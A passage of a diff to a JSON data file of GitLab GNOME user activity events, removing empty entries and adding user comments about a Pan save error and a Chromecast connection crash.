-          "name": "MR FRamar0#t",
-          "username": "firmansyahfikri836",
-          "state": "active",
-          "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-          "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-        },
-        "author_username": "firmansyahfikri836",
-        "user_id": 28917
-      },
-      {
-        "project_id": 9689,
-        "action_name": "closed",
-        "target_id": 700,
-        "target_iid": 1,
-        "target_type": "Milestone",
-        "author_id": 28917,
-        "target_title": "test123",
-        "created_at": "2019-12-26T09:24:59.225Z",
-        "author": {
-          "id": 28917,
-          "name": "MR FRamar0#t",
-          "username": "firmansyahfikri836",
-          "state": "active",
-          "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-          "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-        },
-        "author_username": "firmansyahfikri836",
-        "user_id": 28917
-      },
-      {
-        "project_id": 9689,
-        "action_name": "opened",
-        "target_id": 700,
-        "target_iid": 1,
-        "target_type": "Milestone",
-        "author_id": 28917,
-        "target_title": "test123",
-        "created_at": "2019-12-26T09:25:03.619Z",
-        "author": {
-          "id": 28917,
-          "name": "MR FRamar0#t",
-          "username": "firmansyahfikri836",
-          "state": "active",
-          "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-          "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-        },
-        "author_username": "firmansyahfikri836",
-        "user_id": 28917
-      }
-    ]
-  },
-  {
     "id": 28918,
     "events": [
       {
@@ -14561,14 +14236,6 @@
         "user_id": 28919
       }
     ]
-  },
-  {
-    "id": 28920,
-    "events": []
-  },
-  {
-    "id": 28921,
-    "events": []
   },
   {
     "id": 28922,
@@ -14722,10 +14389,6 @@
         "user_id": 28923
       }
     ]
-  },
-  {
-    "id": 28924,
-    "events": []
   },
   {
     "id": 28925,
@@ -14999,22 +14662,6 @@
     ]
   },
   {
-    "id": 28926,
-    "events": []
-  },
-  {
-    "id": 28927,
-    "events": []
-  },
-  {
-    "id": 28928,
-    "events": []
-  },
-  {
-    "id": 28929,
-    "events": []
-  },
-  {
     "id": 28930,
     "events": [
       {
@@ -15125,10 +14772,6 @@
         "user_id": 28931
       }
     ]
-  },
-  {
-    "id": 28932,
-    "events": []
   },
   {
     "id": 28933,
@@ -15268,18 +14911,6 @@
     ]
   },
   {
-    "id": 28936,
-    "events": []
-  },
-  {
-    "id": 28937,
-    "events": []
-  },
-  {
-    "id": 28938,
-    "events": []
-  },
-  {
     "id": 28940,
     "events": [
       {
@@ -15303,10 +14934,6 @@
         "user_id": 28940
       }
     ]
-  },
-  {
-    "id": 28941,
-    "events": []
   },
   {
     "id": 28942,
@@ -15512,10 +15139,6 @@
         "user_id": 28944
       }
     ]
-  },
-  {
-    "id": 28945,
-    "events": []
   },
   {
     "id": 28946,
@@ -15724,22 +15347,6 @@
     ]
   },
   {
-    "id": 28951,
-    "events": []
-  },
-  {
-    "id": 28952,
-    "events": []
-  },
-  {
-    "id": 28953,
-    "events": []
-  },
-  {
-    "id": 28954,
-    "events": []
-  },
-  {
     "id": 28955,
     "events": [
       {
@@ -15804,10 +15411,6 @@
         "user_id": 28955
       }
     ]
-  },
-  {
-    "id": 28956,
-    "events": []
   },
   {
     "id": 28957,
@@ -16257,10 +15860,6 @@
     ]
   },
   {
-    "id": 28965,
-    "events": []
-  },
-  {
     "id": 28966,
     "events": [
       {
@@ -16432,10 +16031,6 @@
     ]
   },
   {
-    "id": 28970,
-    "events": []
-  },
-  {
     "id": 28972,
     "events": [
       {
@@ -16480,18 +16075,6 @@
         "user_id": 28972
       }
     ]
-  },
-  {
-    "id": 28973,
-    "events": []
-  },
-  {
-    "id": 28974,
-    "events": []
-  },
-  {
-    "id": 28975,
-    "events": []
   },
   {
     "id": 28976,
@@ -16642,10 +16225,6 @@
     ]
   },
   {
-    "id": 28977,
-    "events": []
-  },
-  {
     "id": 28978,
     "events": [
       {
@@ -16708,12 +16287,49 @@
         },
         "author_username": "eschnod",
         "user_id": 28978
+      },
+      {
+        "project_id": 2915,
+        "action_name": "commented on",
+        "target_id": 677401,
+        "target_iid": 677401,
+        "target_type": "Note",
+        "author_id": 28978,
+        "target_title": "Closed Issue #100 still exists. \"Write Error bad file descriptor\"",
+        "created_at": "2020-01-05T02:12:54.831Z",
+        "note": {
+          "id": 677401,
+          "type": null,
+          "body": "At least I'm not alone. About a year ago Pan was working fine with Windows 10.  I didn't use Pan for several months so it may have been a windows update along the way that did this.  I did find that in the last step before saving the file, if I select save attachment and text in the action box drop down, it saves a different kind of file. (.msg file)  I haven't been able to open one yet.  Also if i select Articles from the top menu and save to an NZB, I can use the NZB to get the file(s) using other software.  (I know. Not any help really as far as when using PAN.)  If I find anything new I'll post it here.",
+          "attachment": null,
+          "author": {
+            "id": 28978,
+            "name": "Ernic Schnod",
+            "username": "eschnod",
+            "state": "active",
+            "avatar_url": "https://secure.gravatar.com/avatar/bf934536d3ae8d8019a4dd5374c0c088?s=80&d=identicon",
+            "web_url": "https://gitlab.gnome.org/eschnod"
+          },
+          "created_at": "2020-01-05T02:12:54.239Z",
+          "updated_at": "2020-01-05T02:12:54.239Z",
+          "system": false,
+          "noteable_id": 77450,
+          "noteable_type": "Issue",
+          "resolvable": false,
+          "noteable_iid": 106
+        },
+        "author": {
+          "id": 28978,
+          "name": "Ernic Schnod",
+          "username": "eschnod",
+          "state": "active",
+          "avatar_url": "https://secure.gravatar.com/avatar/bf934536d3ae8d8019a4dd5374c0c088?s=80&d=identicon",
+          "web_url": "https://gitlab.gnome.org/eschnod"
+        },
+        "author_username": "eschnod",
+        "user_id": 28978
       }
     ]
-  },
-  {
-    "id": 28979,
-    "events": []
   },
   {
     "id": 28980,
@@ -16762,6 +16378,67 @@
         },
         "author_username": "giovannicaligaris1",
         "user_id": 28981
+      },
+      {
+        "project_id": 5767,
+        "action_name": "commented on",
+        "target_id": 676992,
+        "target_iid": 676992,
+        "target_type": "Note",
+        "author_id": 28981,
+        "target_title": "Application crash when connecting to Chromecast device",
+        "created_at": "2020-01-04T14:09:04.366Z",
+        "note": {
+          "id": 676992,
+          "type": null,
+          "body": "I have the same issue.\n\nI get error\n\n> note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.",
+          "attachment": null,
+          "author": {
+            "id": 28981,
+            "name": "Giovanni Caligaris",
+            "username": "giovannicaligaris1",
+            "state": "active",
+            "avatar_url": "https://secure.gravatar.com/avatar/10420f9bba4933411ac8992066fccb89?s=80&d=identicon",
+            "web_url": "https://gitlab.gnome.org/giovannicaligaris1"
+          },
+          "created_at": "2020-01-04T14:09:04.087Z",
+          "updated_at": "2020-01-04T14:09:04.087Z",
+          "system": false,
+          "noteable_id": 75773,
+          "noteable_type": "Issue",
+          "resolvable": false,
+          "noteable_iid": 407
+        },
+        "author": {
+          "id": 28981,
+          "name": "Giovanni Caligaris",
+          "username": "giovannicaligaris1",
+          "state": "active",
+          "avatar_url": "https://secure.gravatar.com/avatar/10420f9bba4933411ac8992066fccb89?s=80&d=identicon",
+          "web_url": "https://gitlab.gnome.org/giovannicaligaris1"
+        },
+        "author_username": "giovannicaligaris1",
+        "user_id": 28981
+      },
+      {
+        "project_id": 558,
+        "action_name": "opened",
+        "target_id": 77761,
+        "target_iid": 882,
+        "target_type": "Issue",
+        "author_id": 28981,
+        "target_title": "Add view for mobile / smaller screens (libhandy)",
+        "created_at": "2020-01-04T14:19:18.674Z",
+        "author": {
+          "id": 28981,
+          "name": "Giovanni Caligaris",
+          "username": "giovannicaligaris1",
+          "state": "active",
+          "avatar_url": "https://secure.gravatar.com/avatar/10420f9bba4933411ac8992066fccb89?s=80&d=identicon",
+          "web_url": "https://gitlab.gnome.org/giovannicaligaris1"
+        },
+        "author_username": "giovannicaligaris1",
+        "user_id": 28981
       }
     ]
   },
@@ -16800,10 +16477,6 @@
   },
   {
     "id": 28985,
-    "events": []
-  },
-  {
-    "id": 28986,
     "events": []
   },
   {
@@ -16878,10 +16551,6 @@
     ]
   },
   {
-    "id": 28989,
-    "events": []
-  },
-  {
     "id": 28990,
     "events": [
       {
@@ -16916,10 +16585,6 @@
   },
   {
     "id": 28993,
-    "events": []
-  },
-  {
-    "id": 28994,
     "events": []
   },
   {
@@ -16996,10 +16661,6 @@
         "user_id": 28997
       }
     ]
-  },
-  {
-    "id": 28998,
-    "events": []
   },
   {
     "id": 28999,
